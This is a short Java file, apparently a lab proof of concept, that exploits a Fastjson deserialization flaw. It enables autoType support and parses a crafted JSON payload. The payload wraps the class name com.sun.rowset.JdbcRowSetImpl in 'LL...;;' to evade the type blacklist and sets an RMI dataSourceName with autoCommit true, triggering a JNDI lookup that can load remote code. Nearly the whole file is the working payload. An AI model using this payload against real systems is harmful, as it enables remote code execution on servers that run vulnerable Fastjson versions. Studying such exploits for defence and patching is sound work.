package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.sql.SQLException;

public class TestJdbcRowSetImpl {
    public static void main(String[] args) throws SQLException {
        String fastSer =  "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);

    }
}